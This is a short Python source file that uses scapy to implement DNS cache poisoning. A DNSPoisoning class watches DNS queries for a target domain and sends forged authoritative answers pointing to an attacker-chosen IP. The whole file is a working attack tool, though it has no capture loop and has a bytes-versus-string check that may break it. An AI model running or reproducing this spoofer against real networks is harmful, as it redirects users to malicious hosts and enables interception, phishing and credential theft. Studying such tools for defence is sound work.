from scapy.all import *
# from netfilterqueue import NetfilterQueue
import argparse
import sys
import os

from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP


class DNSPoisoning():
    def __init__(self, spoof_ip, target_dom):
        self.spoof_ip = spoof_ip
        self.target_dom = target_dom
        
        
    def poison_dns(self, pkt):
        if pkt.haslayer(DNSQR):  # checking if the packet has DNS
            qname = pkt[DNSQR].qname
            if self.target_dom in qname:
                print(f"Spoofing DNS response from: {qname.decode()}")
 
                # creating spoofed DNS response
                spoofed_pkt =(IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(id=pkt[DNS].id, qr=1, aa=1,qd=pkt[DNS].qd,
                    an=DNSRR(rrname=qname, ttl=50, rdata=self.spoof_ip)))  # changing only rdata
                
                send(spoofed_pkt, verbose=0)